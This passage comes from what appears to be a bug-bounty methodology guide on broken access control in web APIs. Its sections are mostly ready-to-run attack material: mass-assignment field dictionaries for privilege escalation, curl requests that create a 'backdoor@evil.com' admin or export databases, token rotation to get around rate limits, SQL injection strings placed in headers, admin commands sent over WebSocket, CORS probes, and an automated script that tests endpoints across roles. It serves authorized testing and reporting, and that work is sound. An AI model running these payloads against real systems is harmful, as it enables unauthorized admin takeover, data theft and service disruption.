A project access token with "reporter" role could be used to modify project settings (normally requiring "maintainer"). The access control was checked at the API endpoint level but not granularly per-attribute within the settings update.

## 11. Impact Escalation Through Access Control

| Finding | Base Severity | Chain With | Final Severity |
|---------|--------------|------------|----------------|
| Missing function-level auth on admin endpoint | High | Data access | Critical — full admin |
| JWT role not validated on server | Critical | Admin ATO | Critical — ATO |
| GraphQL field exposure | Medium | IDOR | High — data leak |
| Method bypass (GET → POST) | Medium | Privilege escalation | High — state change |
| Header-based admin access | Critical | Direct admin | Critical — admin control |
| Missing CORS validation | Low | XSS | High — data theft |
| Admin parameter in request | High | Mass admin | Critical — mass privesc |
| Workflow step skip | Medium | Admin creation | Critical — unauthorized admin |
| Multi-tenant auth bypass | Critical | Cross-tenant | Critical — all tenants |

## 12. Methodology Cheat Sheet

1. **Map endpoints** — enumerate all API paths with a focus on admin, internal, and management routes
2. **Create role hierarchy** — provision accounts at every privilege level
3. **Test each endpoint with each role** — use a script to automate
4. **Test every HTTP method** — GET may be 403 but POST could be 200
5. **Add auth bypass headers** — X-Admin, X-Internal, X-Forwarded-For, custom tokens
6. **Manipulate roles in tokens** — modify JWT claims, cookie values, request body fields
7. **Test method override** — X-HTTP-Method-Override headers
8. **Test GraphQL resolvers** — query for admin fields with user-level tokens
9. **Test function-level RPC endpoints** — /api/rpc, /api/execute, /api/command
10. **Test create vs read vs update vs delete separately** — each may have different auth

## 13. Mass Assignment Field Dictionary

The definitive list of fields to inject in every update/create request:

### 13.1 Role / Privilege Fields

```python
PRIVILEGE_FIELDS = {
    # String roles
    "role": "admin",
    "roles": ["admin", "super_admin"],
    "user_type": "admin",
    "account_type": "enterprise",
    "membership": "premium",
    "plan": "enterprise_unlimited",
    "tier": "premium",
    "access_level": "admin",
    "clearance": "top_secret",
    "group": "administrators",
    "groups": ["administrators", "superusers"],
    "team": "executive",
    
    # Boolean flags
    "is_admin": True,
    "is_superuser": True,
    "is_staff": True,
    "is_verified": True,
    "verified": True,
    "email_verified": True,
    "phone_verified": True,
    "kyc_verified": True,
    "is_active": True,
    "active": True,
    "enabled": True,
    "is_enterprise": True,
    "is_premium": True,
    "is_internal": True,
    "can_access_admin": True,
    
    # Numeric access levels
    "role_id": 1,
    "permission_level": 9999,
    "access_level": 9999,
    "clearance_level": 5,
    "security_level": 5,
    
    # Permission arrays
    "permissions": ["read", "write", "delete", "admin", "manage_users", "manage_billing"],
    "scopes": ["admin", "read", "write", "delete"],
    "claims": ["admin", "manage", "audit"],
    
    # Business fields
    "quota": 999999,
    "rate_limit": 999999,
    "max_users": 99999,
    "max_projects": 99999,
    "max_storage": 999999999,
    "billing_tier": "enterprise",
    "billing_plan": "unlimited",
    "subscription_status": "active",
    "trial_end": "2099-12-31",
    "credit": 999999,
    "balance": 999999,
}
```

### 13.2 Ownership / Tenant Manipulation

```python
OWNERSHIP_FIELDS = {
    "owner_id": 1,
    "owner": 1,
    "organization_id": 1,
    "organization": 1,
    "company_id": 1,
    "tenant_id": 1,
    "account_id": 1,
    "workspace_id": 1,
    "team_id": 1,
    "project_id": 1,
    "group_id": 1,
    "department_id": 1,
    "parent_id": 0,
    "root_id": 0,
    "created_by": 1,
    "updated_by": 1,
    "assigned_to": 1,
    "transferred_to": 1,
}
```

## 14. Advanced BFLA (Broken Function Level Authorization)

BFLA occurs when a low-privilege user can call functions/endpoints reserved for higher-privilege roles.

### 14.1 RPC/Command Endpoint Testing

```bash
# Generic RPC/command endpoints — dangerous pattern
curl -s "$TARGET/api/rpc" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"method": "createUser", "params": {"email": "backdoor@evil.com", "role": "admin"}}'

curl -s "$TARGET/api/execute" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command": "shutdownSystem", "force": true}'

curl -s "$TARGET/api/command" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"action": "exportDatabase", "format": "sql"}'

# Test all known RPC methods
for method in createUser deleteUser promoteUser demoteUser \
              shutdownSystem restartService clearCache exportDatabase \
              createAdmin grantAccess revokeAccess sendNotification \
              updateConfig reloadConfig toggleFeature; do
  curl -s "$TARGET/api/rpc" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"method\": \"$method\", \"params\": {}}" | head -c 200
  echo "---"
done
```

### 14.2 Direct Object Access on Functions

```bash
# Test if low-priv can access admin-only functions
curl -s "$TARGET/api/admin/shutdown" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/reboot" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/backup/create" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/maintenance/enable" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/logs/export" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/cache/clear" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/migrations/run" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/notifications/broadcast" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/feature-flags/set" -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/admin/environment/update" -H "Authorization: Bearer $TOKEN"
```

### 14.3 Hidden Admin Parameters on User-Level Endpoints

```bash
# Endpoint: POST /api/users/me/profile
# Add admin-targeted parameters:
curl -s -X PATCH "$TARGET/api/users/me/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test",
    "bypass_approval": true,
    "internal_note": "hidden field test",
    "admin_override": true,
    "skip_verification": true,
    "force_activation": true,
    "managed_by": "self",
    "allow_admin_impersonation": true
  }'
```

## 15. API-Key / Token Scope Escalation

```bash
# If the API uses scoped tokens, test if scopes are enforced
# Token with scope "read:users" — can it write?

# Test each endpoint with a restricted token
curl -s -X PUT "$TARGET/api/users/me" \
  -H "Authorization: Bearer READ_ONLY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}'
# If 200 -> read token can write! Scope escalation

# Test token against admin endpoints
curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer USER_TOKEN"
# If 200 -> scope escalation to admin

# Token creation with wider scopes
curl -s -X POST "$TARGET/api/tokens/create" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test",
    "scopes": ["admin", "read:all", "write:all", "delete:all"],
    "expires": "never"
  }'
# If this creates a token with wider scope than $TOKEN has -> scope escalation
```

## 16. Rate Limit Bypass for Access Control Enumeration

```bash
# When rate limiting blocks enumeration, use these techniques:

# 1. Slow down
for id in $(seq 1 100); do
  curl -s "$TARGET/api/users/$id" -H "Authorization: Bearer $TOKEN"
  sleep 0.$((RANDOM % 10))  # Random delay 0.0-0.9s
done

# 2. Rotate tokens
for id in $(seq 1 100); do
  case $((id % 3)) in
    0) TOKEN=$TOKEN_A ;;
    1) TOKEN=$TOKEN_B ;;
    2) TOKEN=$TOKEN_C ;;
  esac
  curl -s "$TARGET/api/users/$id" -H "Authorization: Bearer $TOKEN"
done

# 3. Use conditional headers
curl -s "$TARGET/api/users/1" \
  -H "Authorization: Bearer $TOKEN" \
  -H "If-None-Match: \"abc\""  # Cache bypass
curl -s "$TARGET/api/users/1" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Cache-Control: no-cache"

# 4. Use different content types
curl -s "$TARGET/api/users/1" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/xml"  # May be processed differently

# 5. Use HTTP/2 multiplexing for parallel requests
curl --http2 -s "$TARGET/api/users/1" -H "Authorization: Bearer $TOKEN" \
  --next -s "$TARGET/api/users/2" -H "Authorization: Bearer $TOKEN" \
  --next -s "$TARGET/api/users/3" -H "Authorization: Bearer $TOKEN"
```

## 17. Reporting Access Control Findings

When writing access control reports:

- **Always use TWO accounts** — demonstrate Account A accessing Account B's resources or admin functions
- **Include exact HTTP requests** — paste-into-Burp-ready format
- **Show both success AND expected failure** — sequential test fails, parallel/ bypassed test succeeds
- **Demonstrate concrete impact** — "Modified victim's email" not "Could modify victim's email"
- **Chain for maximum severity** — function-level access + sensitive data read = Critical
- **Test from fresh session** — reproduce in incognito with new tokens
- **Include evidence of privilege** — screenshot showing admin panel access with user-level token

```markdown
## Report Template

### Title: [Broken Access Control] [Role] can access [Endpoint] leading to [Impact]

### Summary
A [role] user can access [endpoint/function] that should require [expected_role] privileges.

### Steps to Reproduce
1. Login as [low_priv_role] (token: [TOKEN])
2. Send the following request:
   ```
   [FULL HTTP REQUEST]
   ```
3. Observe response: [HTTP 200 + sensitive data / state change]

### Impact
[What the attacker can achieve with this access]

### Proof
[Screenshot or response dump showing the unauthorized access]

### Remediation
Implement server-side authorization checks on [endpoint].
Validate that the authenticated user's role/permissions allow the requested operation.
```

## 18. Tooling Reference

| Tool | Purpose | Usage |
|------|---------|-------|
| Burp Autorize | Automated token-swapping for IDOR detection | Install from BApp Store |
| Burp Auto Repeater | Conditional request modification | Replace user IDs automatically |
| ffuf | Endpoint and ID enumeration | `ffuf -u "$TARGET/api/users/FUZZ" -w ids.txt` |
| Arjun | Parameter discovery | `arjun -u "$TARGET/api/endpoint"` |
| GraphQLMap | GraphQL access control testing | `python3 graphqlmap.py -u $TARGET/graphql` |
| InQL | GraphQL introspection | Burp extension for schema analysis |
| JWT Tool | JWT manipulation | `jwt_tool $JWT -T` |
| JWT_HACK | JWT algorithm confusion | `python3 jwt_hack.py` |
| Mass Assignment Scanner | Custom scripts | See Section 9.1 |

## 19. OAuth Social Login Access Control Bypass

OAuth/SSO integrations often have weaker access control than native auth routes.

```bash
# If the app supports "Sign in with Google/GitHub/Facebook":
# 1. Register a normal account (already done)
# 2. Link OAuth provider to the normal account via social link
# 3. Check if email verification / role validation is skipped for OAuth accounts

curl -s "$TARGET/api/oauth/google/callback?code=ATTACKER_CODE" \
  -H "Authorization: Bearer $TOKEN"

# Test OAuth role inheritance
# Standard login returns:
# {"id":1042,"role":"user","email":"user@test.com"}
# OAuth login should return same or lower role — test for escalation:
# {"id":1042,"role":"admin","email":"user@gmail.com"}
# If OAuth assigns higher role -> privilege escalation

# Test if OAuth bypasses admin checks
curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer OAUTH_TOKEN"
```

### 19.1 Mixed-Role Account Confusion

```bash
# Some apps have different auth paths for different roles:
# - SSO for employees/contractors (role=admin automatically)
# - Email/password for customers (role=user)

# Test if you can use an admin SSO token on customer API endpoints
curl -s "$TARGET/api/internal/admin/users" \
  -H "Authorization: Bearer SSO_TOKEN"

# Test if you can use a customer token on admin SSO endpoints
curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer CUSTOMER_TOKEN"
```

## 20. Time-of-Check to Time-of-Use (TOCTOU) in Access Control

Access control checked at the start of a session/navigation but not re-validated:

```bash
# 1. Login as user, get session
LOGIN_RESP=$(curl -s -X POST "$TARGET/api/login" \
  -d '{"email":"user@test.com","password":"test"}')
SESSION=$(echo "$LOGIN_RESP" | jq -r '.session')

# 2. While keeping that session, get the user promoted to admin
# (through another means — social engineering, admin mistake, etc.)

# 3. The old session token might now have admin access
# because authorization was checked at login, not at every request
curl -s "$TARGET/api/admin/users" \
  -H "Cookie: session=$SESSION"
# If 200 and session issued BEFORE role change -> TOCTOU access control gap

# Reverse test:
# 1. Login as admin, get admin session
ADMIN_SESS=$(curl -s -X POST "$TARGET/api/login" \
  -d '{"email":"admin@test.com","password":"test"}' | jq -r '.session')

# 2. Have admin demoted to user (password reset, role change)

# 3. Old admin session might still work
curl -s "$TARGET/api/admin/users" \
  -H "Cookie: session=$ADMIN_SESS"
# If 200 -> TOCTOU — permissions not re-evaluated on each request
```

## 21. Database-Level Access Control Gaps

When authorization logic lives in the database (RBAC tables), direct database interaction bypasses it:

```bash
# If the app uses SQL to check permissions, try:
# - SQL injection to return true for permission checks
# - NoSQL injection to match permission queries

# Example: Permission-check endpoint
curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer $TOKEN"
# Server queries: SELECT role FROM users WHERE id = ? AND role = 'admin'

# Try SQLi in parameters that influence the query
curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-User-Id: ' OR role='admin' --"
curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-User-Id: 1' OR '1'='1"
```

## 22. Testing Access Control in Microservices

In microservice architectures, authorization is often inconsistent:

```bash
# Service A (auth) may validate roles correctly
# Service B (data) may trust the auth token without re-validation

# Test each service by calling it directly
curl -s "$TARGET/api/payments/admin/transactions" \
  -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/analytics/admin/users" \
  -H "Authorization: Bearer $TOKEN" 
curl -s "$TARGET/api/billing/admin/invoices" \
  -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/notifications/admin/broadcast" \
  -H "Authorization: Bearer $TOKEN"
curl -s "$TARGET/api/audit/admin/logs" \
  -H "Authorization: Bearer $TOKEN"

# If any one service returns 200 while others return 403 -> microservice auth gap

# Test with slightly malformed tokens that different services might parse differently
curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer eyJleHAiOjE3MDAwMDAwMDB9"  # truncated token
curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer null"
curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer undefined"
```

## 23. Python Automated Authorization Matrix Tester

```python
#!/usr/bin/env python3
"""
Full authorization matrix tester.
Tests every endpoint with every role and reports gaps.
"""
import requests
import json
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"

# Define role hierarchy
ROLES = {
    "anonymous": {"token": None, "level": 0},
    "user": {"token": "USER_TOKEN", "level": 10},
    "premium": {"token": "PREMIUM_TOKEN", "level": 20},
    "moderator": {"token": "MOD_TOKEN", "level": 50},
    "admin": {"token": "ADMIN_TOKEN", "level": 99},
    "superadmin": {"token": "SUPER_TOKEN", "level": 100},
}

# Expected minimum level per endpoint
ENDPOINT_MATRIX = {
    # Format: "METHOD /path": expected_min_role_level
    "GET /login": 0,           # Everyone
    "POST /login": 0,
    "GET /signup": 0,
    "POST /signup": 0,
    "POST /password/reset": 0,
    
    "GET /api/users/me": 10,   # Authenticated
    "PUT /api/users/me": 10,
    
    "GET /api/users": 99,      # Admin only
    "GET /api/users/{id}": 50,  # Moderator+
    "POST /api/users": 99,     # Admin only
    "PUT /api/users/{id}": 50,
    "DELETE /api/users/{id}": 99,
    
    "GET /api/admin/settings": 99,
    "PUT /api/admin/settings": 100,  # Superadmin only
    "GET /api/admin/logs": 99,
    
    "GET /api/billing/invoices": 10,
    "GET /api/billing/admin": 99,
    
    "POST /api/feature-flags": 100,
    "GET /api/feature-flags": 99,
}

def test_endpoint(method, path, token, role_name, expected_level):
    """Test a single endpoint with given role"""
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    url = f"{BASE_URL}{path}"
    
    try:
        r = requests.request(method, url, headers=headers, timeout=10)
        
        role_level = ROLES[role_name]["level"]
        expected_min_level = expected_level
        
        result = {
            "method": method,
            "path": path,
            "role": role_name,
            "role_level": role_level,
            "expected_level": expected_min_level,
            "status": r.status_code,
            "length": len(r.content)
        }
        
        # Access granted when it should NOT be
        if role_level < expected_min_level and r.status_code in [200, 201, 202, 204]:
            result["finding"] = "UPLIFT"
            result["severity"] = "CRITICAL" if expected_min_level >= 99 else "HIGH"
            result["detail"] = f"Role '{role_name}' (level {role_level}) accessed {method} {path} (expected admin level {expected_level})"
        
        # Access DENIED when it SHOULD be granted (DoS bug)
        elif role_level >= expected_min_level and r.status_code in [401, 403]:
            result["finding"] = "DENIAL"
            result["severity"] = "MEDIUM"
            result["detail"] = f"Role '{role_name}' (level {role_level}) DENIED access to {method} {path} (should be allowed at level {expected_level})"
        
        return result
    except Exception as e:
        return {"error": str(e), "method": method, "path": path, "role": role_name}

results = []
with ThreadPoolExecutor(max_workers=20) as executor:
    futures = []
    for endpoint, expected_level in ENDPOINT_MATRIX.items():
        method, path = endpoint.split(" ", 1)
        for role_name, role_data in ROLES.items():
            futures.append(executor.submit(
                test_endpoint, method, path, role_data["token"], role_name, expected_level
            ))
    
    for future in as_completed(futures):
        r = future.result()
        results.append(r)
        if "finding" in r:
            severity = r.get("severity", "INFO")
            icon = "🔴" if severity == "CRITICAL" else ("🟡" if severity == "HIGH" else "🟢")
            print(f"{icon} [{severity}] {r['detail']} -> HTTP {r['status']}")

# Generate report
findings = [r for r in results if r.get("finding")]
with open("auth_matrix_findings.json", "w") as f:
    json.dump(findings, f, indent=2)

print(f"\n{'='*60}")
print(f"Total tests: {len(results)}")
print(f"Findings: {len(findings)}")
print(f"  Critical: {len([f for f in findings if f.get('severity') == 'CRITICAL'])}")
print(f"  High: {len([f for f in findings if f.get('severity') == 'HIGH'])}")
print(f"  Medium: {len([f for f in findings if f.get('severity') == 'MEDIUM'])}")
print(f"Full report: auth_matrix_findings.json")
```

## 24. WebSocket Access Control Testing

WebSocket connections often have weaker access control because the initial handshake is the only auth check:

```bash
# Test WebSocket connection with low-priv token
wscat -c "wss://$TARGET/ws?token=$TOKEN"
# Within WebSocket, try sending admin commands
> {"action": "subscribe", "channel": "admin-notifications"}
> {"action": "get", "resource": "admin/users"}
> {"action": "admin:shutdown"}
> {"action": "createUser", "role": "admin", "email": "backdoor@evil.com"}

# Some WebSocket implementations check auth only on connect.
# Try connecting and then getting session demoted - messages may still work.
```

## 25. CORS + CSRF → Access Control Bypass

When CORS allows arbitrary origins, CSRF can bypass IP-based access controls:

```bash
# If the endpoint returns:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true

# Create an HTML page that:
# 1. Victim visits (authenticated to target)
# 2. Page sends cross-origin request to admin endpoint
# 3. CORS leaks the response back to attacker

# Test payload:
curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Origin: https://attacker.com" \
  -v 2>&1 | grep -iE "access-control|origin"

# If Access-Control-Allow-Origin echoes the Origin header ->
# CORS misconfiguration allows data theft

# Check X-Frame-Options for clickjacking admin actions
curl -sI "$TARGET/api/admin/users" | grep -i "x-frame-options"
# If missing -> can frame admin panel in an iframe
```

## 26. Indicator Reference

Signs of access control issues during testing:

| Indicator | Likely Issue | Action |
|-----------|-------------|--------|
| 200 with data when expected 403 | Missing function-level auth | Prove impact, document |
| 401 vs 403 distinction | Different auth layers | Test endpoint without token |
| Non-standard error messages | Incomplete middleware | Check for data leaks |
| Different response lengths for blocked vs allowed | Enumeration possible | Iterate IDs for IDOR |
| Admin endpoints in client-side JS | Hidden routes exist | Fuzz hidden paths |
| GraphQL suggestions enabled (Did you mean...) | Schema reveals admin fields | Query suggested fields |
| API version has different auth (v1 vs v2) | Auth middleware drift | Test all versions |
| Internal vs external API same token | No privilege boundary | Test internal routes |
| WebSocket connects with expired JWT | Auth check only at connect | Replay stale tokens |
| Admin operations in auto-generated API docs | Undocumented routes | Extract from Swagger/OpenAPI |

## 27. Access Control Test Checklist

- [ ] Map admin endpoint inventory (ffuf, common paths, JS files)
- [ ] Create role hierarchy (anonymous, user, power user, moderator, admin)
- [ ] Test each endpoint with each role (automated matrix)
- [ ] Test each HTTP method (GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD)
- [ ] Test method override headers (X-HTTP-Method-Override)
- [ ] Test JWT role manipulation (algorithm none, field injection)
- [ ] Test cookie role manipulation
- [ ] Test parameter role manipulation (role=admin, isAdmin=true)
- [ ] Test header-based access (X-Admin, X-Internal, X-Forwarded-For)
- [ ] Test mass assignment during profile update
- [ ] Test mass assignment during registration
- [ ] Test GraphQL resolver authorization
- [ ] Test microservice boundary authorization
- [ ] Test CORS + CSRF chaining
- [ ] Test WebSocket authorization
- [ ] Test OAuth/SSO authorization parity
- [ ] Test TOCTOU (role change during session)
- [ ] Test RBAC bypass via direct SQL/NoSQL injection
- [ ] Test API version drift (new endpoints, old auth)
- [ ] Test admin parameter injection on user-level endpoints
